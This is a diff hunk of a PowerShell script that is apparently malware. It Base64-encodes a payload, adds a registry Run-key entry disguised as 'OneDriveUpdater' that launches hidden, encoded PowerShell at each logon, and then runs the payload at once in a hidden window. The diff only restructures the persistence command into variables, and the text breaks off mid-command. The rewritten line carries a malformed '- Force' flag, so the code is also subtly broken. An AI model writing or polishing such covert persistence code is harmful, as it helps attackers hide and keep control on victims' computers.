@@ -4,11 +4,26 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
 $encodedPayload = [Convert]::ToBase64String($bytes)
 
 # Persistence via Registry (Stealthy) 
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+<# New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 -Name "OneDriveUpdater" `
 -Value "powershell.exe -nop -windowstyle hidden `
 -encodedcommand $encodedPayload" `
 -PropertyType String -Force
+#>
+
+# Define the registry path
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Define the registry entry name
+$entryName = "OneDriveUpdater"
+
+
+# Define the program to run (powershell.exe)
+$entryValue = "powershell.exe -nop -windowstyle hidden -encodedcommand $encodedPayload"
+
+# Create the registry entry
+New-ItemProperty -Path $regPath -Name $entryName -Value $entryValue -PropertyType String - Force
+
 
 # Execute payload immediately (stealthily)
 Start-Process -WindowStyle Hidden powershell.exe "-nop -encodedcommand
